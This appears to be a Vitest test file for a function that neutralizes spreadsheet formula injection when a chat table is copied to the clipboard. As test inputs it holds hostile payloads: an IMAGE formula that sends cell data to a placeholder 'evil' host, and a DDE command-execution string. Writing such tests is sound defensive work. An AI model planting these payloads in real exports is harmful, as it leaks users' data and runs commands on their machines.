import { describe, expect, it } from "vitest";
import { clipboardCell } from "@/components/chat/tool-renderers/tableClipboard";

describe("clipboardCell (chat table → spreadsheet paste)", () => {
  it("neutralizes text a spreadsheet would run as a formula", () => {
    expect(clipboardCell('=IMAGE("https://evil/?"&A1)', '=IMAGE("https://evil/?"&A1)')).toBe(`'=IMAGE("https://evil/?"&A1)`);
    expect(clipboardCell("+cmd|' /C calc'!A0", "+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(clipboardCell("-2+3+A1", "-2+3+A1")).toBe("'-2+3+A1");
    expect(clipboardCell("@SUM(A1:A9)", "@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
    expect(clipboardCell("  =1+1", "  =1+1")).toBe("'  =1+1");
    // A leading tab / CR is neutralized, then flattened so it can't split the row.
    expect(clipboardCell("\t=1", "\t=1")).toBe("' =1");
    expect(clipboardCell("\rx", "\rx")).toBe("' x");
  });

  it("keeps numbers (negative ones included) and ordinary text as they are", () => {
    expect(clipboardCell(-1200, "-$1,200.00")).toBe("-$1,200.00");
    expect(clipboardCell(-0.125, "-12.5%")).toBe("-12.5%");
    expect(clipboardCell("-1,200.5", "-1,200.5")).toBe("-1,200.5");
    expect(clipboardCell("+3", "+3")).toBe("+3");
    expect(clipboardCell("Meta — prospecting", "Meta — prospecting")).toBe("Meta — prospecting");
    expect(clipboardCell("a\nb\tc", "a\nb\tc")).toBe("a b c");
  });
});
